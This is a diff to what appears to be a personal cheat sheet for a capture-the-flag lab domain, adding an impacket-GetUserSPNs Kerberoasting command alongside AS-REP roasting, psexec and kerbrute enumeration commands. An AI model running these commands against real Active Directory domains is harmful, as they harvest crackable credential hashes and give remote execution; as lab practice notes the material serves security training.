@@ -80,6 +80,10 @@ impacket-GetNPUsers vulnet-rst.local/ -no-pass -userfile users.txt
 ```
 impacket-psexec vulnnet-rst.local/a-whitehat@10.10.216.107
 ```
+## Impacker-GetUserSPNs
+```
+impacket-GetUserSPNs vulnnet-rst.local/$username:$password -dc-ip $ip -request
+```
 # Kerbrute
 ```
 kerbrute -users Username_wordlist.txt -domain vulnnet-rst.local -dc-ip $ip
